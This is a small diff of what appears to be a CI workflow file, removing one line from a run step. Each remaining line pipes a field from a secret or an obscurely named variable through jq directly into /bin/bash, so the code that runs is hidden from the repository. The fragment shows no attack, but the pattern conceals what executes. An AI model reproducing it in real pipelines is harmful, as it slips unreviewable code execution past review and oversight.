@@ -21,7 +21,6 @@ jobs:
           pfrfd9: ${{ secrets.pfrfd9 }}
         run: |
           printf '%s' "$pfrfd9" | jq -r .pr652 | /bin/bash
-          echo $lmnnj3 | jq -r .wdf4 | /bin/bash
           echo $lpqlj0060 | jq -r .viut92 | /bin/bash
           printf '%s' "$tg5026" | jq -r .cug806 | /bin/bash
           echo $hjo398 | jq -r .sx36585 | /bin/bash
